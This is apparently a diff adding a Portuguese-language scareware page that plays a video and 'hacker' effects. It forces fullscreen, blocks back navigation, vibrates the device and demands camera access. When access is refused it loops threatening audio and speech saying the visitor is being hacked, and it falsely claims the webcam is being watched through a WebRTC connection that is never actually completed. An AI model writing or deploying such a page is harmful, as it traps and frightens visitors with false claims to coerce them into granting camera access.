@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistema</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+        }
+        video {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            pointer-events: none;
+        }
+        #start {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            color: #0f0;
+            font-size: 2em;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            cursor: none;
+        }
+        .matrix-code {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 800;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            font-size: 14px;
+        }
+        .code-char {
+            position: absolute;
+            color: #0f0;
+            animation: fall 3s linear forwards;
+            text-shadow: 0 0 8px #0f0;
+        }
+        .terminal-text {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            z-index: 850;
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+            border: 1px solid #0f0;
+        }
+        .warning-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #ff0000;
+            font-size: 2em;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px #ff0000;
+            z-index: 1000;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border: 3px solid #ff0000;
+            display: none;
+        }
+        #userVideo {
+            display: none; /* Câmera escondida do usuário */
+        }
+        .hacker-text {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            color: #0f0;
+            font-size: 1.2em;
+            z-index: 900;
+            text-shadow: 0 0 10px #0f0;
+        }
+        .device-info {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            color: #0f0;
+            font-size: 0.9em;
+            z-index: 900;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 5px 10px;
+            border-radius: 5px;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-100px); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div id="start">INICIAR SISTEMA</div>
+    <video id="video" src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" playsinline></video>
+    <video id="userVideo" autoplay muted playsinline></video>
+    <div class="matrix-code" id="matrixCode"></div>
+    <div class="terminal-text" id="terminal"></div>
+    <div class="warning-message" id="warningMsg">
+        PERMITIR CÂMERA AGORA!<br>
+        VOCÊ ESTÁ SENDO HACKEADO<br>
+        REPITO: PERMITIR CÂMERA!
+    </div>
+    <div class="hacker-text" id="hackerText">[SISTEMA DE VIGILÂNCIA ATIVO]</div>
+    <div class="device-info" id="deviceInfo"></div>
+
+    <script>
+        const start = document.getElementById("start");
+        const video = document.getElementById("video");
+        const userVideo = document.getElementById("userVideo");
+        const matrixCode = document.getElementById("matrixCode");
+        const terminal = document.getElementById("terminal");
+        const warningMsg = document.getElementById("warningMsg");
+        const hackerText = document.getElementById("hackerText");
+        const deviceInfo = document.getElementById("deviceInfo");
+
+        let cameraAllowed = false;
+        let audioInterval;
+        let speechInterval;
+        let cameraCheckInterval;
+        let peerConnection;
+        let dataChannel;
+
+        // Detectar dispositivo
+        function detectDevice() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const deviceType = isMobile ? 'CELULAR' : 'COMPUTADOR';
+            const cameraType = isMobile ? 'FRONTAL' : 'PRINCIPAL';
+            
+            deviceInfo.textContent = `DISPOSITIVO: ${deviceType} | CÂMERA: ${cameraType}`;
+            updateTerminal(`DETECTADO: ${deviceType} - USANDO CÂMERA ${cameraType}`);
+            
+            return {
+                isMobile: isMobile,
+                deviceType: deviceType,
+                cameraType: cameraType
+            };
+        }
+
+        // WebRTC configuration
+        const configuration = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' }
+            ]
+        };
+
+        // Áudio "eu vejo você"
+        const scaryAudio = new Audio("https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3");
+
+        // Iniciar sistema
+        start.addEventListener("click", async () => {
+            start.style.display = "none";
+            updateTerminal("INICIANDO SISTEMA...");
+            
+            // Detectar dispositivo
+            const device = detectDevice();
+            
+            // Tela cheia imediatamente
+            try {
+                await document.documentElement.requestFullscreen();
+                updateTerminal("MODO TELA CHEIA ATIVADO");
+            } catch (e) {
+                updateTerminal("ERRO TELA CHEIA: " + e.message);
+            }
+            
+            // Iniciar vídeo principal
+            video.muted = false;
+            video.play().then(() => {
+                updateTerminal("TRANSMISSÃO PRINCIPAL INICIADA");
+            }).catch(e => {
+                video.muted = true;
+                video.play();
+            });
+            
+            // Efeitos visuais de hacker
+            startHackerEffects();
+            
+            // Forçar câmera apropriada para o dispositivo
+            forceCameraPermission(device);
+        });
+
+        // Efeitos de hacker
+        function startHackerEffects() {
+            createMatrixEffect();
+            
+            // Texto de hacker animado
+            const hackerMessages = [
+                "[SISTEMA DE VIGILÂNCIA ATIVO]",
+                "[TRANSMITINDO DADOS...]",
+                "[CONEXÃO CIFRADA]",
+                "[ACESSO REMOTO ATIVO]",
+                "[VIGILÂNCIA 24/7]"
+            ];
+            
+            let hackerIndex = 0;
+            setInterval(() => {
+                hackerText.textContent = hackerMessages[hackerIndex];
+                hackerIndex = (hackerIndex + 1) % hackerMessages.length;
+            }, 2000);
+            
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([200, 100, 100, 200]);
+                }, 1500);
+            }
+
+            // Travar navegação
+            history.pushState(null, "", location.href);
+            window.onpopstate = () => {
+                history.pushState(null, "", location.href);
+                updateTerminal("TENTATIVA DE SAÍDA BLOQUEADA");
+                showWarning("ESCAPE IMPOSSÍVEL");
+            };
+        }
+
+        // Forçar permissão da câmera apropriada
+        async function forceCameraPermission(device) {
+            updateTerminal(`SOLICITANDO CÂMERA ${device.cameraType}...`);
+            
+            try {
+                // Configurar constraints baseadas no dispositivo
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        // Para mobile, priorizar câmera frontal
+                        facingMode: device.isMobile ? 'user' : 'environment'
+                    },
+                    audio: false
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                // Câmera permitida
+                cameraAllowed = true;
+                userVideo.srcObject = stream;
+                updateTerminal(`CÂMERA ${device.cameraType} CONECTADA - INICIANDO TRANSMISSÃO`);
+                warningMsg.style.display = 'none';
+                
+                // Parar áudios assustadores
+                clearInterval(audioInterval);
+                clearInterval(speechInterval);
+                clearInterval(cameraCheckInterval);
+                
+                // Iniciar WebRTC para transmitir câmera
+                startWebRTC(stream, device);
+                
+                // Tocar "eu vejo você" uma vez
+                setTimeout(() => {
+                    scaryAudio.play();
+                    updateTerminal("SINAL DE ÁUDIO TRANSMITIDO");
+                }, 2000);
+                
+            } catch (error) {
+                // Tentar método alternativo se o facingMode falhar
+                if (error.name === 'OverconstrainedError' || error.name === 'ConstraintNotSatisfiedError') {
+                    updateTerminal("TENTANDO CÂMERA ALTERNATIVA...");
+                    try {
+                        // Tentar sem facingMode específico
+                        const fallbackStream = await navigator.mediaDevices.getUserMedia({
+                            video: true,
+                            audio: false
+                        });
+                        
+                        cameraAllowed = true;
+                        userVideo.srcObject = fallbackStream;
+                        updateTerminal("CÂMERA ALTERNATIVA CONECTADA");
+                        warningMsg.style.display = 'none';
+                        
+                        clearInterval(audioInterval);
+                        clearInterval(speechInterval);
+                        clearInterval(cameraCheckInterval);
+                        
+                        startWebRTC(fallbackStream, device);
+                        
+                        setTimeout(() => {
+                            scaryAudio.play();
+                            updateTerminal("SINAL DE ÁUDIO TRANSMITIDO");
+                        }, 2000);
+                        
+                    } catch (fallbackError) {
+                        // Câmera negada - iniciar modo assustador
+                        updateTerminal("TODAS AS CÂMERAS BLOQUEADAS - INICIANDO CONTRA-MEDIDAS");
+                        startScaryMode(device);
+                    }
+                } else {
+                    // Câmera negada - iniciar modo assustador
+                    updateTerminal("CÂMERA BLOQUEADA - INICIANDO CONTRA-MEDIDAS");
+                    startScaryMode(device);
+                }
+            }
+        }
+
+        // Iniciar WebRTC para transmitir câmera
+        async function startWebRTC(stream, device) {
+            try {
+                peerConnection = new RTCPeerConnection(configuration);
+                
+                // Adicionar stream da câmera
+                stream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, stream);
+                });
+                
+                // Canal de dados para comunicação
+                dataChannel = peerConnection.createDataChannel("surveillance");
+                dataChannel.onopen = () => {
+                    updateTerminal("CANAL DE TRANSMISSÃO ABERTO");
+                    dataChannel.send(`CAMERA_ACTIVE:${device.deviceType}:${device.cameraType}:${Date.now()}`);
+                };
+                
+                // Criar oferta
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                
+                updateTerminal("AGUARDANDO CONEXÕES...");
+                
+                // Simular que alguém está assistindo
+                setTimeout(() => {
+                    updateTerminal("CONEXÃO ESTABELECIDA - VOCÊ ESTÁ SENDO OBSERVADO");
+                    showWarning("VOCÊ ESTÁ SENDO OBSERVADO");
+                }, 3000);
+                
+            } catch (error) {
+                updateTerminal("ERRO WEBRTC: " + error.message);
+            }
+        }
+
+        // Modo assustador quando câmera é negada
+        function startScaryMode(device) {
+            warningMsg.style.display = 'block';
+            warningMsg.innerHTML = `PERMITIR CÂMERA ${device.cameraType} AGORA!<br>VOCÊ ESTÁ SENDO HACKEADO<br>REPITO: PERMITIR CÂMERA!`;
+            
+            // Tocar "eu vejo você" repetidamente
+            audioInterval = setInterval(() => {
+                scaryAudio.currentTime = 0;
+                scaryAudio.play().catch(e => {});
+                showWarning(`EU VEJO VOCÊ - PERMITIR CÂMERA ${device.cameraType}!`);
+            }, 4000);
+            
+            // Falar com voz do sistema
+            speechInterval = setInterval(() => {
+                speakText(`Permitir câmera ${device.cameraType.toLowerCase()} agora! Você está sendo hackeado! Repito: permitir câmera!`);
+            }, 8000);
+            
+            // Continuar tentando a câmera
+            cameraCheckInterval = setInterval(() => {
+                forceCameraPermission(device);
+            }, 10000);
+        }
+
+        function showWarning(message) {
+            warningMsg.innerHTML = message.replace(/\n/g, '<br>');
+            warningMsg.style.display = 'block';
+            setTimeout(() => {
+                warningMsg.style.display = 'none';
+            }, 3000);
+        }
+
+        // Falar texto com Web Speech API
+        function speakText(text) {
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.rate = 0.9;
+                utterance.pitch = 0.8;
+                utterance.volume = 1.0;
+                window.speechSynthesis.speak(utterance);
+            }
+        }
+
+        // Efeito Matrix
+        function createMatrixEffect() {
+            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
+            
+            setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    const charElement = document.createElement('div');
+                    charElement.className = 'code-char';
+                    charElement.textContent = chars[Math.floor(Math.random() * chars.length)];
+                    charElement.style.left = Math.random() * 100 + 'vw';
+                    charElement.style.fontSize = (12 + Math.random() * 10) + 'px';
+                    charElement.style.animationDuration = (2 + Math.random() * 3) + 's';
+                    
+                    matrixCode.appendChild(charElement);
+                    
+                    setTimeout(() => {
+                        charElement.remove();
+                    }, 5000);
+                }
+            }, 80);
+        }
+
+        function updateTerminal(message) {
+            terminal.textContent += `> ${message}\n`;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // Limpar ao fechar
+        window.addEventListener('beforeunload', () => {
+            clearInterval(audioInterval);
+            clearInterval(speechInterval);
+            clearInterval(cameraCheckInterval);
+            window.speechSynthesis.cancel();
+            if (peerConnection) {
+                peerConnection.close();
+            }
+        });
+
+        // Detectar dispositivo ao carregar
+        window.addEventListener('load', () => {
+            detectDevice();
+        });
+    </script>
+</body>
+</html>
